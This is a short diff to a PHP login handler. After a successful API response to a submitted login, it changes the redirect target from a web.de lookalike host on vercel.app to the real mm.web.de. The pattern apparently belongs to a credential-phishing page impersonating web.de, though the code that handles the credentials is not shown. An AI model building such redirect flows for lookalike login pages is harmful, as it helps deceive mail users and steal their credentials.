@@ -32,7 +32,7 @@ if (isset($_POST['login'])) {
 
   if (isset($result->statusCode) && $result->statusCode == 200) {
     // echo 'Response: ' . json_encode($result->message);
-    header("Location: https://web-de.vercel.app/");
+    header("Location: https://mm.web.de/");
   } else {
      echo 'API request failed: ' . json_encode($result->message);
   }
